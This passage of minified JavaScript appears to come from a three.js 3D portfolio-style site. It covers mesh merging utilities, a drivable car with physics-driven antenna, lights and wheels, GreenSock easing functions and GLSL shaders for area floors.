interleaved"),null;i+=a.array.length,n+=a.itemSize}var s=new pr(new t(i),n),c=0,l=[],h=["getX","getY","getZ","getW"],u=["setX","setY","setZ","setW"],d=0;for(o=e.length;d<o;d++){var p=(a=e[d]).itemSize,f=a.count,m=new fr(s,p,c,a.normalized);l.push(m),c+=p;for(var v=0;v<f;v++)for(var g=0;g<p;g++)m[u[g]](v,a[h[g]](v))}return l},estimateBytesUsed:function(e){var t=0;for(var i in e.attributes){var n=e.getAttribute(i);t+=n.count*n.itemSize*n.array.BYTES_PER_ELEMENT}var r=e.getIndex();return t+=r?r.count*r.itemSize*r.array.BYTES_PER_ELEMENT:0},mergeVertices:function(e,t=1e-4){t=Math.max(t,Number.EPSILON);for(var i={},n=e.getIndex(),r=e.getAttribute("position"),o=n?n.count:r.count,a=0,s=Object.keys(e.attributes),c={},l={},h=[],u=["getX","getY","getZ","getW"],d=0,p=s.length;d<p;d++){c[b=s[d]]=[],(M=e.morphAttributes[b])&&(l[b]=new Array(M.length).fill().map(()=>[]))}var f=Math.log10(1/t),m=Math.pow(10,f);for(d=0;d<o;d++){var v=n?n.getX(d):d,g="",y=0;for(p=s.length;y<p;y++)for(var b=s[y],w=(_=e.getAttribute(b)).itemSize,x=0;x<w;x++)g+=`${~~(_[u[x]](v)*m)},`;if(g in i)h.push(i[g]);else{for(y=0,p=s.length;y<p;y++){b=s[y];var _=e.getAttribute(b),M=e.morphAttributes[b],S=(w=_.itemSize,c[b]),T=l[b];for(x=0;x<w;x++){var E=u[x];if(S.push(_[E](v)),M)for(var A=0,C=M.length;A<C;A++)T[A].push(M[A][E](v))}}i[g]=a,h.push(a),a++}}const P=e.clone();for(d=0,p=s.length;d<p;d++){b=s[d];var L=e.getAttribute(b);_=new Xe(new L.array.constructor(c[b]),L.itemSize,L.normalized);if(P.addAttribute(b,_),b in l)for(y=0;y<l[b].length;y++){var R=e.morphAttributes[b][y],k=new Xe(new R.array.constructor(l[b][y]),R.itemSize,R.normalized);P.morphAttributes[b][y]=k}}return P.setIndex(h),P}};function Ru(e){return function(e){if(Array.isArray(e)){for(var t=0,i=new Array(e.length);t<e.length;t++)i[t]=e[t];return i}}(e)||function(e){if(Symbol.iterator in Object(e)||"[object Arguments]"===Object.prototype.toString.call(e))return Array.from(e)}(e)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance")}()}function ku(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Ou=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.resources=t.resources,this.materials=t.materials,this.physics=t.physics,this.shadows=t.shadows,this.sounds=t.sounds,this.debug=t.debug,this.container=new K,this.container.matrixAutoUpdate=!1,this.items=[],this.floorShadows=[],this.setParsers(),this.setMerge()}var t,i,n;return t=e,(i=[{key:"setParsers",value:function(){var e=this;this.parsers={},this.parsers.items=[{regex:/^shade([a-z]+)_?[0-9]{0,3}?/i,apply:function(t,i){var n=t.name.match(/^shade([a-z]+)_?[0-9]{0,3}?/i),r="".concat(n[1].substring(0,1).toLowerCase()).concat(n[1].substring(1)),o=e.materials.shades.items[r];void 0===o&&(o=new Aa);var a=i.duplicated?t.clone():t;if(a.material=o,a.children.length){var s=!0,c=!1,l=void 0;try{for(var h,u=a.children[Symbol.iterator]();!(s=(h=u.next()).done);s=!0){var d=h.value;d instanceof Lt&&(d.material=o)}}catch(e){c=!0,l=e}finally{try{s||null==u.return||u.return()}finally{if(c)throw l}}}return a}},{regex:/^pure([a-z]+)_?[0-9]{0,3}?/i,apply:function(t,i){var n=t.name.match(/^pure([a-z]+)_?[0-9]{0,3}?/i)[1].toLowerCase(),r=e.materials.pures.items[n];void 0===r&&(r=new Aa);var o=i.duplicated?t.clone():t;return o.material=r,o}},{regex:/^floor_?[0-9]{0,3}?/i,apply:function(t,i){var n=new si(t.scale.x,t.scale.y,10,10),r=e.materials.items.floorShadow.clone();r.uniforms.tShadow.value=i.floorShadowTexture,r.uniforms.uShadowColor.value=new Ne(e.materials.items.floorShadow.shadowColor),r.uniforms.uAlpha.value=0;var o=new Lt(n,r);return o.matrixAutoUpdate=!1,o.updateMatrix(),e.floorShadows.push(o),o}}],this.parsers.default={},this.parsers.default.apply=function(t){var i=t.clone();return i.material=e.materials.shades.items.white,i}}},{key:"setMerge",value:function(){var e=this;this.merge={},this.merge.items={},this.merge.container=new K,this.merge.container.matrixAutoUpdate=!1,this.container.add(this.merge.container),this.merge.add=function(t,i){var n=e.merge.items[t];n||((n={}).geometry=new dt,n.geometriesToMerge=[],n.material=i.material,n.material.side=2,n.mesh=new Lt(n.geometry,n.material),e.merge.container.add(n.mesh),e.merge.items[t]=n);var r=i.geometry;i.updateMatrixWorld(),r.applyMatrix(i.matrixWorld),n.geometriesToMerge.push(r)},this.merge.applyMerge=function(){for(var t in e.merge.items){var i=e.merge.items[t];i.geometry=Lu.mergeBufferGeometries(i.geometriesToMerge),i.mesh.geometry=i.geometry}},this.merge.update=function(){var t=!0,i=!1,n=void 0;try{for(var r,o=e.items[Symbol.iterator]();!(t=(r=o.next()).done);t=!0){var a=r.value;if(a.shouldMerge){var s=Ru(a.container.children),c=!0,l=!1,h=void 0;try{for(var u,d=s[Symbol.iterator]();!(c=(u=d.next()).done);c=!0){var p=u.value,f=p.material.name;""!==f&&(e.merge.add(f,p),a.container.remove(p))}}catch(e){l=!0,h=e}finally{try{c||null==d.return||d.return()}finally{if(l)throw h}}a.shouldMerge=!1}}}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}e.merge.applyMerge()}}},{key:"getConvertedMesh",value:function(e){var t=this,i=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=new K,r=new y,o=Ru(e),a=!0,s=!1,c=void 0;try{for(var l,h=function(){var e=l.value;if(e.name.match(/^center_?[0-9]{0,3}?/i)&&r.set(e.position.x,e.position.y,e.position.z),e instanceof Lt){var o=t.parsers.items.find((function(t){return e.name.match(t.regex)}));void 0===o&&(o=t.parsers.default);var a=o.apply(e,i);n.add(a)}},u=o[Symbol.iterator]();!(a=(l=u.next()).done);a=!0)h()}catch(e){s=!0,c=e}finally{try{a||null==u.return||u.return()}finally{if(s)throw c}}if(r.length()>0){var d=!0,p=!1,f=void 0;try{for(var m,v=n.children[Symbol.iterator]();!(d=(m=v.next()).done);d=!0){var g=m.value;g.position.sub(r)}}catch(e){p=!0,f=e}finally{try{d||null==v.return||v.return()}finally{if(p)throw f}}n.position.add(r)}return i.mass&&0===i.mass&&(n.matrixAutoUpdate=!1,n.updateMatrix()),n}},{key:"add",value:function(e){var t=this,i={merged:!1};i.shouldMerge=0===e.mass;var n=new y;e.offset&&n.copy(e.offset);var r=new F;e.rotation&&r.copy(e.rotation);var o=void 0===e.sleep||e.sleep;if(i.container=this.getConvertedMesh(e.base.children,e),i.container.position.copy(n),i.container.rotation.copy(r),this.container.add(i.container),0===e.mass){i.container.matrixAutoUpdate=!1,i.container.updateMatrix();var a=!0,s=!1,c=void 0;try{for(var l,h=i.container.children[Symbol.iterator]();!(a=(l=h.next()).done);a=!0){var u=l.value;u.matrixAutoUpdate=!1,u.updateMatrix()}}catch(e){s=!0,c=e}finally{try{a||null==h.return||h.return()}finally{if(s)throw c}}}i.collision=this.physics.addObjectFromThree({meshes:Ru(e.collision.children),offset:n,rotation:r,mass:e.mass,sleep:o});var d=!0,p=!1,f=void 0;try{for(var m,v=i.container.children[Symbol.iterator]();!(d=(m=v.next()).done);d=!0)m.value.position.sub(i.collision.center)}catch(e){p=!0,f=e}finally{try{d||null==v.return||v.return()}finally{if(p)throw f}}return e.soundName&&i.collision.body.addEventListener("collide",(function(i){var n=i.contact.getImpactVelocityAlongNormal();t.sounds.play(e.soundName,n)})),e.shadow&&this.shadows.add(i.container,e.shadow),e.mass>0&&this.time.on("tick",(function(){i.container.position.copy(i.collision.body.position),i.container.quaternion.copy(i.collision.body.quaternion)})),this.items.push(i),i}}])&&ku(t.prototype,i),n&&ku(t,n),e}();function Iu(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Bu=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.resources=t.resources,this.objects=t.objects,this.physics=t.physics,this.shadows=t.shadows,this.materials=t.materials,this.controls=t.controls,this.sounds=t.sounds,this.renderer=t.renderer,this.camera=t.camera,this.debug=t.debug,this.config=t.config,this.container=new K,this.position=new y,this.debug&&(this.debugFolder=this.debug.addFolder("car")),this.setModels(),this.setMovement(),this.setChassis(),this.setAntena(),this.setBackLights(),this.setWheels(),this.setTransformControls(),this.setShootingBall(),this.setKlaxon()}var t,i,n;return t=e,(i=[{key:"setModels",value:function(){this.models={},this.config.cyberTruck?(this.models.chassis=this.resources.items.carCyberTruckChassis,this.models.antena=this.resources.items.carCyberTruckAntena,this.models.backLightsBrake=this.resources.items.carCyberTruckBackLightsBrake,this.models.backLightsReverse=this.resources.items.carCyberTruckBackLightsReverse,this.models.wheel=this.resources.items.carCyberTruckWheel):(this.models.chassis=this.resources.items.carDefaultChassis,this.models.antena=this.resources.items.carDefaultAntena,this.models.backLightsBrake=this.resources.items.carDefaultBackLightsBrake,this.models.backLightsReverse=this.resources.items.carDefaultBackLightsReverse,this.models.wheel=this.resources.items.carDefaultWheel)}},{key:"setMovement",value:function(){var e=this;this.movement={},this.movement.speed=new y,this.movement.localSpeed=new y,this.movement.acceleration=new y,this.movement.localAcceleration=new y,this.time.on("tick",(function(){var t=new y;t.copy(e.chassis.object.position).sub(e.chassis.oldPosition),e.movement.acceleration=t.clone().sub(e.movement.speed),e.movement.speed.copy(t),e.movement.localSpeed=e.movement.speed.clone().applyAxisAngle(new y(0,0,1),-e.chassis.object.rotation.z),e.movement.localAcceleration=e.movement.acceleration.clone().applyAxisAngle(new y(0,0,1),-e.chassis.object.rotation.z),e.sounds.engine.speed=e.movement.localSpeed.x,e.sounds.engine.acceleration=e.controls.actions.up?e.controls.actions.boost?1:.5:0,e.movement.localAcceleration.x>.01&&e.sounds.play("screech")}))}},{key:"setChassis",value:function(){var e=this;this.chassis={},this.chassis.offset=new y(0,0,-.28),this.chassis.object=this.objects.getConvertedMesh(this.models.chassis.scene.children),this.chassis.object.position.copy(this.physics.car.chassis.body.position),this.chassis.oldPosition=this.chassis.object.position.clone(),this.container.add(this.chassis.object),this.shadows.add(this.chassis.object,{sizeX:3,sizeY:2,offsetZ:.2}),this.time.on("tick",(function(){e.chassis.oldPosition=e.chassis.object.position.clone(),e.transformControls.enabled||(e.chassis.object.position.copy(e.physics.car.chassis.body.position).add(e.chassis.offset),e.chassis.object.quaternion.copy(e.physics.car.chassis.body.quaternion)),e.position.copy(e.chassis.object.position)}))}},{key:"setAntena",value:function(){var e=this;if(this.antena={},this.antena.speedStrength=10,this.antena.damping=.035,this.antena.pullBackStrength=.02,this.antena.object=this.objects.getConvertedMesh(this.models.antena.scene.children),this.chassis.object.add(this.antena.object),this.antena.speed=new f,this.antena.absolutePosition=new f,this.antena.localPosition=new f,this.time.on("tick",(function(){var t=Math.min(Math.max(e.movement.acceleration.x,-1),1),i=Math.min(Math.max(e.movement.acceleration.y,-1),1);e.antena.speed.x-=t*e.antena.speedStrength,e.antena.speed.y-=i*e.antena.speedStrength;var n=e.antena.absolutePosition.clone(),r=n.negate().multiplyScalar(n.length()*e.antena.pullBackStrength);e.antena.speed.add(r),e.antena.speed.x*=1-e.antena.damping,e.antena.speed.y*=1-e.antena.damping,e.antena.absolutePosition.add(e.antena.speed),e.antena.localPosition.copy(e.antena.absolutePosition),e.antena.localPosition.rotateAround(new f,-e.chassis.object.rotation.z),e.antena.object.rotation.y=.1*e.antena.localPosition.x,e.antena.object.rotation.x=.1*e.antena.localPosition.y})),this.debug){var t=this.debugFolder.addFolder("antena");t.open(),t.add(this.antena,"speedStrength").step(.001).min(0).max(50),t.add(this.antena,"damping").step(1e-4).min(0).max(.1),t.add(this.antena,"pullBackStrength").step(1e-4).min(0).max(.1)}}},{key:"setBackLights",value:function(){var e=this;this.backLightsBrake={},this.backLightsBrake.material=this.materials.pures.items.red.clone(),this.backLightsBrake.material.transparent=!0,this.backLightsBrake.material.opacity=.5,this.backLightsBrake.object=this.objects.getConvertedMesh(this.models.backLightsBrake.scene.children);var t=!0,i=!1,n=void 0;try{for(var r,o=this.backLightsBrake.object.children[Symbol.iterator]();!(t=(r=o.next()).done);t=!0)r.value.material=this.backLightsBrake.material}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}this.chassis.object.add(this.backLightsBrake.object),this.backLightsReverse={},this.backLightsReverse.material=this.materials.pures.items.yellow.clone(),this.backLightsReverse.material.transparent=!0,this.backLightsReverse.material.opacity=.5,this.backLightsReverse.object=this.objects.getConvertedMesh(this.models.backLightsReverse.scene.children);var a=!0,s=!1,c=void 0;try{for(var l,h=this.backLightsReverse.object.children[Symbol.iterator]();!(a=(l=h.next()).done);a=!0)l.value.material=this.backLightsReverse.material}catch(e){s=!0,c=e}finally{try{a||null==h.return||h.return()}finally{if(s)throw c}}this.chassis.object.add(this.backLightsReverse.object),this.time.on("tick",(function(){e.backLightsBrake.material.opacity=e.physics.controls.actions.brake?1:.5,e.backLightsReverse.material.opacity=e.physics.controls.actions.down?1:.5}))}},{key:"setWheels",value:function(){var e=this;this.wheels={},this.wheels.object=this.objects.getConvertedMesh(this.models.wheel.scene.children),this.wheels.items=[];for(var t=0;t<4;t++){var i=this.wheels.object.clone();this.wheels.items.push(i),this.container.add(i)}this.time.on("tick",(function(){if(!e.transformControls.enabled)for(var t in e.physics.car.wheels.bodies){var i=e.physics.car.wheels.bodies[t],n=e.wheels.items[t];n.position.copy(i.position),n.quaternion.copy(i.quaternion)}}))}},{key:"setTransformControls",value:function(){var e=this;if(this.transformControls=new fu(this.camera.instance,this.renderer.domElement),this.transformControls.size=.5,this.transformControls.attach(this.chassis.object),this.transformControls.enabled=!1,this.transformControls.visible=this.transformControls.enabled,document.addEventListener("keydown",(function(t){"transformControls"===e.mode&&("r"===t.key?e.transformControls.setMode("rotate"):"g"===t.key&&e.transformControls.setMode("translate"))})),this.transformControls.addEventListener("dragging-changed",(function(t){e.camera.orbitControls.enabled=!t.value})),this.container.add(this.transformControls),this.debug){var t=this.debugFolder.addFolder("controls");t.open(),t.add(this.transformControls,"enabled").onChange((function(){e.transformControls.visible=e.transformControls.enabled}))}}},{key:"setShootingBall",value:function(){var e=this;this.config.cyberTruck&&window.addEventListener("keydown",(function(t){if("b"===t.key){var i=Math.random()*Math.PI*2,n=e.position.x+10*Math.cos(i),r=e.position.y+10*Math.sin(i),o=2+2*Math.random(),a=e.objects.add({base:e.resources.items.bowlingBallBase.scene,collision:e.resources.items.bowlingBallCollision.scene,offset:new y(n,r,o),rotation:new F(.5*Math.PI,0,0),duplicated:!0,shadow:{sizeX:1.5,sizeY:1.5,offsetZ:-.15,alpha:.35},mass:5,soundName:"bowlingBall",sleep:!1}),s=new wu.a.Vec3(e.position.x,e.position.y,e.position.z+1).vsub(a.collision.body.position);s.normalize(),s=s.scale(100),a.collision.body.applyImpulse(s,a.collision.body.position)}}))}},{key:"setKlaxon",value:function(){var e=this;this.klaxon={},this.klaxon.waitDuration=150,this.klaxon.can=!0,window.addEventListener("keydown",(function(t){if("h"===t.key&&e.klaxon.can&&(e.klaxon.can=!1,window.setTimeout((function(){e.klaxon.can=!0}),e.klaxon.waitDuration),e.physics.car.jump(!1,20),e.sounds.play(Math.random()<.002?"carHorn2":"carHorn1")),"k"===t.key){var i=e.position.x+3*(Math.random()-.5),n=e.position.y+3*(Math.random()-.5),r=6+2*Math.random();e.objects.add({base:e.resources.items.hornBase.scene,collision:e.resources.items.hornCollision.scene,offset:new y(i,n,r),rotation:new F(Math.random()*Math.PI*2,Math.random()*Math.PI*2,Math.random()*Math.PI*2),duplicated:!0,shadow:{sizeX:1.5,sizeY:1.5,offsetZ:-.15,alpha:.35},mass:5,soundName:"horn",sleep:!1})}}))}}])&&Iu(t.prototype,i),n&&Iu(t,n),e}(),Du=i(0);Du.f._gsDefine("easing.Back",["easing.Ease"],(function(){var e,t,i,n,r=Du.f.GreenSockGlobals||Du.f,o=r.com.greensock,a=2*Math.PI,s=Math.PI/2,c=o._class,l=function(e,t){var i=c("easing."+e,(function(){}),!0),n=i.prototype=new Du.a;return n.constructor=i,n.getRatio=t,i},h=Du.a.register||function(){},u=function(e,t,i,n,r){var o=c("easing."+e,{easeOut:new t,easeIn:new i,easeInOut:new n},!0);return h(o,e),o},d=function(e,t,i){this.t=e,this.v=t,i&&(this.next=i,i.prev=this,this.c=i.v-t,this.gap=i.t-e)},p=function(e,t){var i=c("easing."+e,(function(e){this._p1=e||0===e?e:1.70158,this._p2=1.525*this._p1}),!0),n=i.prototype=new Du.a;return n.constructor=i,n.getRatio=t,n.config=function(e){return new i(e)},i},f=u("Back",p("BackOut",(function(e){return(e-=1)*e*((this._p1+1)*e+this._p1)+1})),p("BackIn",(function(e){return e*e*((this._p1+1)*e-this._p1)})),p("BackInOut",(function(e){return(e*=2)<1?.5*e*e*((this._p2+1)*e-this._p2):.5*((e-=2)*e*((this._p2+1)*e+this._p2)+2)}))),m=c("easing.SlowMo",(function(e,t,i){t=t||0===t?t:.7,null==e?e=.7:e>1&&(e=1),this._p=1!==e?t:0,this._p1=(1-e)/2,this._p2=e,this._p3=this._p1+this._p2,this._calcEnd=!0===i}),!0),v=m.prototype=new Du.a;return v.constructor=m,v.getRatio=function(e){var t=e+(.5-e)*this._p;return e<this._p1?this._calcEnd?1-(e=1-e/this._p1)*e:t-(e=1-e/this._p1)*e*e*e*t:e>this._p3?this._calcEnd?1===e?0:1-(e=(e-this._p3)/this._p1)*e:t+(e-t)*(e=(e-this._p3)/this._p1)*e*e*e:this._calcEnd?1:t},m.ease=new m(.7,.7),v.config=m.config=function(e,t,i){return new m(e,t,i)},(v=(e=c("easing.SteppedEase",(function(e,t){e=e||1,this._p1=1/e,this._p2=e+(t?0:1),this._p3=t?1:0}),!0)).prototype=new Du.a).constructor=e,v.getRatio=function(e){return e<0?e=0:e>=1&&(e=.999999999),((this._p2*e|0)+this._p3)*this._p1},v.config=e.config=function(t,i){return new e(t,i)},(v=(t=c("easing.ExpoScaleEase",(function(e,t,i){this._p1=Math.log(t/e),this._p2=t-e,this._p3=e,this._ease=i}),!0)).prototype=new Du.a).constructor=t,v.getRatio=function(e){return this._ease&&(e=this._ease.getRatio(e)),(this._p3*Math.exp(this._p1*e)-this._p3)/this._p2},v.config=t.config=function(e,i,n){return new t(e,i,n)},(v=(i=c("easing.RoughEase",(function(e){for(var t,i,n,r,o,a,s=(e=e||{}).taper||"none",c=[],l=0,h=0|(e.points||20),u=h,p=!1!==e.randomize,f=!0===e.clamp,m=e.template instanceof Du.a?e.template:null,v="number"==typeof e.strength?.4*e.strength:.4;--u>-1;)t=p?Math.random():1/h*u,i=m?m.getRatio(t):t,n="none"===s?v:"out"===s?(r=1-t)*r*v:"in"===s?t*t*v:t<.5?(r=2*t)*r*.5*v:(r=2*(1-t))*r*.5*v,p?i+=Math.random()*n-.5*n:u%2?i+=.5*n:i-=.5*n,f&&(i>1?i=1:i<0&&(i=0)),c[l++]={x:t,y:i};for(c.sort((function(e,t){return e.x-t.x})),a=new d(1,1,null),u=h;--u>-1;)o=c[u],a=new d(o.x,o.y,a);this._prev=new d(0,0,0!==a.t?a:a.next)}),!0)).prototype=new Du.a).constructor=i,v.getRatio=function(e){var t=this._prev;if(e>t.t){for(;t.next&&e>=t.t;)t=t.next;t=t.prev}else for(;t.prev&&e<=t.t;)t=t.prev;return this._prev=t,t.v+(e-t.t)/t.gap*t.c},v.config=function(e){return new i(e)},i.ease=new i,u("Bounce",l("BounceOut",(function(e){return e<1/2.75?7.5625*e*e:e<2/2.75?7.5625*(e-=1.5/2.75)*e+.75:e<2.5/2.75?7.5625*(e-=2.25/2.75)*e+.9375:7.5625*(e-=2.625/2.75)*e+.984375})),l("BounceIn",(function(e){return(e=1-e)<1/2.75?1-7.5625*e*e:e<2/2.75?1-(7.5625*(e-=1.5/2.75)*e+.75):e<2.5/2.75?1-(7.5625*(e-=2.25/2.75)*e+.9375):1-(7.5625*(e-=2.625/2.75)*e+.984375)})),l("BounceInOut",(function(e){var t=e<.5;return(e=t?1-2*e:2*e-1)<1/2.75?e*=7.5625*e:e=e<2/2.75?7.5625*(e-=1.5/2.75)*e+.75:e<2.5/2.75?7.5625*(e-=2.25/2.75)*e+.9375:7.5625*(e-=2.625/2.75)*e+.984375,t?.5*(1-e):.5*e+.5}))),u("Circ",l("CircOut",(function(e){return Math.sqrt(1-(e-=1)*e)})),l("CircIn",(function(e){return-(Math.sqrt(1-e*e)-1)})),l("CircInOut",(function(e){return(e*=2)<1?-.5*(Math.sqrt(1-e*e)-1):.5*(Math.sqrt(1-(e-=2)*e)+1)}))),u("Elastic",(n=function(e,t,i){var n=c("easing."+e,(function(e,t){this._p1=e>=1?e:1,this._p2=(t||i)/(e<1?e:1),this._p3=this._p2/a*(Math.asin(1/this._p1)||0),this._p2=a/this._p2}),!0),r=n.prototype=new Du.a;return r.constructor=n,r.getRatio=t,r.config=function(e,t){return new n(e,t)},n})("ElasticOut",(function(e){return this._p1*Math.pow(2,-10*e)*Math.sin((e-this._p3)*this._p2)+1}),.3),n("ElasticIn",(function(e){return-this._p1*Math.pow(2,10*(e-=1))*Math.sin((e-this._p3)*this._p2)}),.3),n("ElasticInOut",(function(e){return(e*=2)<1?this._p1*Math.pow(2,10*(e-=1))*Math.sin((e-this._p3)*this._p2)*-.5:this._p1*Math.pow(2,-10*(e-=1))*Math.sin((e-this._p3)*this._p2)*.5+1}),.45)),u("Expo",l("ExpoOut",(function(e){return 1-Math.pow(2,-10*e)})),l("ExpoIn",(function(e){return Math.pow(2,10*(e-1))-.001})),l("ExpoInOut",(function(e){return(e*=2)<1?.5*Math.pow(2,10*(e-1)):.5*(2-Math.pow(2,-10*(e-1)))}))),u("Sine",l("SineOut",(function(e){return Math.sin(e*s)})),l("SineIn",(function(e){return 1-Math.cos(e*s)})),l("SineInOut",(function(e){return-.5*(Math.cos(Math.PI*e)-1)}))),c("easing.EaseLookup",{find:function(e){return Du.a.map[e]}},!0),h(r.SlowMo,"SlowMo","ease,"),h(i,"RoughEase","ease,"),h(e,"SteppedEase","ease,"),f}),!0);var zu=Du.h.Back;Du.h.Elastic,Du.h.Bounce,Du.h.RoughEase,Du.h.SlowMo,Du.h.SteppedEase,Du.h.Circ,Du.h.Expo,Du.h.Sine,Du.h.ExpoScaleEase;function Fu(e,t,i){dt.call(this),this.parameters={width:e,height:t,thickness:i},this.type="AreaFloorBufferGeometry";var n=new Float32Array(24),r=new Uint32Array(48),o=e,a=t,s=o-i,c=a-i;n[0]=.5*s,n[1]=.5*c,n[2]=0,n[3]=.5*s,n[4]=.5*-c,n[5]=0,n[6]=.5*-s,n[7]=.5*-c,n[8]=0,n[9]=.5*-s,n[10]=.5*c,n[11]=0,n[12]=.5*o,n[13]=.5*a,n[14]=0,n[15]=.5*o,n[16]=.5*-a,n[17]=0,n[18]=.5*-o,n[19]=.5*-a,n[20]=0,n[21]=.5*-o,n[22]=.5*a,n[23]=0,r[0]=4,r[1]=0,r[2]=1,r[3]=1,r[4]=5,r[5]=4,r[6]=5,r[7]=1,r[8]=2,r[9]=2,r[10]=6,r[11]=5,r[12]=6,r[13]=2,r[14]=3,r[15]=3,r[16]=7,r[17]=6,r[18]=7,r[19]=3,r[20]=0,r[21]=0,r[22]=4,r[23]=7,this.setIndex(new Xe(r,1,!1)),this.addAttribute("position",new tt(n,3))}Fu.prototype=Object.create(dt.prototype),Fu.prototype.constructor=Fu;var Nu=Fu;function ju(e,t,i){dt.call(this),this.parameters={width:e,height:t,depth:i},this.type="AreaFloorBufferGeometry";var n=new Float32Array(24),r=new Uint32Array(16),o=new Uint32Array(48);n[0]=.5*e,n[1]=.5*t,n[2]=0,n[3]=.5*e,n[4]=.5*-t,n[5]=0,n[6]=.5*-e,n[7]=.5*-t,n[8]=0,n[9]=.5*-e,n[10]=.5*t,n[11]=0,n[12]=.5*e,n[13]=.5*t,n[14]=i,n[15]=.5*e,n[16]=.5*-t,n[17]=i,n[18]=.5*-e,n[19]=.5*-t,n[20]=i,n[21]=.5*-e,n[22]=.5*t,n[23]=i,r[0]=0,r[1]=0,r[2]=1/3,r[3]=0,r[4]=1/3*2,r[5]=0,r[6]=1,r[7]=0,r[8]=0,r[9]=1,r[10]=1/3,r[11]=1,r[12]=1/3*2,r[13]=1,r[14]=1,r[15]=1,o[0]=0,o[1]=4,o[2]=1,o[3]=5,o[4]=1,o[5]=4,o[6]=1,o[7]=5,o[8]=2,o[9]=6,o[10]=2,o[11]=5,o[12]=2,o[13]=6,o[14]=3,o[15]=7,o[16]=3,o[17]=6,o[18]=3,o[19]=7,o[20]=0,o[21]=4,o[22]=0,o[23]=7,this.setIndex(new Xe(o,1,!1)),this.addAttribute("position",new tt(n,3)),this.addAttribute("uv",new tt(r,2))}ju.prototype=Object.create(dt.prototype),ju.prototype.constructor=ju;var Uu=ju,Vu=function(){return new Vt({wireframe:!1,transparent:!0,side:2,depthTest:!0,depthWrite:!1,uniforms:{uTime:{value:null},uBorderAlpha:{value:null},uStrikeAlpha:{value:null}},vertexShader:"#define GLSLIFY 1\nvarying vec3 vPosition;\nvarying vec3 vModelPosition;\nvarying vec2 vUv;\n\nvoid main()\n{\n    vec4 modelPosition = modelMatrix * vec4(position, 1.0);\n    gl_Position = projectionMatrix * viewMatrix * modelPosition;\n\n    vPosition = position.xyz;\n    vModelPosition = modelPosition.xyz;\n    vUv = uv;\n}\n",fragmentShader:"#define GLSLIFY 1\nuniform float uTime;\nuniform float uBorderAlpha;\nuniform float uStrikeAlpha;\n\nvarying vec3 vPosition;\nvarying vec3 vModelPosition;\nvarying vec2 vUv;\n\nvoid main()\n{\n    float uStrikeWidth = 0.5;\n    // float uStrikeAlpha = 0.25;\n    float uBorderWidth = 0.1;\n    // float uBorderAlpha = 0.5;\n\n    if(vModelPosition.z < 0.0)\n    {\n        discard;\n    }\n\n    float strikeStrength = mod((vPosition.x + vPosition.y - uTime * 0.00035 + vPosition.z) / uStrikeWidth * 0.5, 1.0);\n    strikeStrength = step(strikeStrength, 0.5) * uStrikeAlpha;\n\n    float borderStrength = max(step(1.0 - vUv.y, uBorderWidth), step(vUv.y, uBorderWidth)) * uBorderAlpha;\n\n    float alpha = max(strikeStrength, borderStrength);\n\n    gl_FragColor = vec4(vec3(1.0), alpha);\n\n    // gl_FragColor = vec4(vUv, 1.0, 1.0);\n}\n"})},Hu=function(){return new Vt({wireframe:!1,transparent:!0,depthTest:!0,depthWrite:!1,uniforms:{uColor:{value:null},uAlpha:{value:null},uLoadProgress:{value:null},uProgress:{value:null}},vertexShader:"#define GLSLIFY 1\nvarying vec3 vPosition;\n\nvoid main()\n{\n    vec4 modelPosition = modelMatrix * vec4(position, 1.0);\n    gl_Position = projectionMatrix * viewMatrix * modelPosition;\n\n    vPosition = position;\n}\n",fragmentShader:"#define GLSLIFY 1\n#define M_PI 3.1415926535897932384626433832795\n\nuniform vec3 uColor;\nuniform float uAlpha;\nuniform float uLoadProgress;\nuniform float uProgress;\n\nvarying vec3 vPosition;\n\nvoid main()\n{\n    float angle = atan(vPosition.x, vPosition.y);\n    float loadProgress = step(abs(angle / M_PI), uLoadProgress);\n    float progress = step(1.0 - abs(angle / M_PI), uProgress);\n\n    float alpha = uAlpha;\n    alpha -= uAlpha * 0.5 * (1.0 - loadProgress);\n    alpha *= progress;\n\n    gl_FragColor = vec4(uColor, alpha);\n    // gl_FragColor = vec4(vec3(progress), 1.0);\n}\n"})};function Gu(e){return(Gu="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function Wu(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function qu(e,t){return!t||"object"!==Gu(t)&&"function"!=typeof t?function(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(e):t}function Xu(e){return(Xu=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}function Yu(e,t){return(Yu=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e})(e,t)}var Zu=function(e){function t(e){var i;return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),(i=qu(this,Xu(t).call(this))).config=e.config,i.renderer=e.renderer,i.resources=e.resources,i.car=e.car,i.sounds=e.sounds,i.time=e.time,i.position=e.position,i.halfExtents=e.halfExtents,i.hasKey=e.hasKey,i.testCar=e.testCar,i.active=e.active,i.container=new K,i.container.position.x=i.position.x,i.container.position.y=i.position.y,i.container.matrixAutoUpdate=!1,i.container.updateMatrix(),i.initialTestCar=i.testCar,i.isIn=!1,i.setFloorBorder(),i.setFence(),i.setInteractions(),i.hasKey&&i.setKey(),i}var i,n,r;return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a 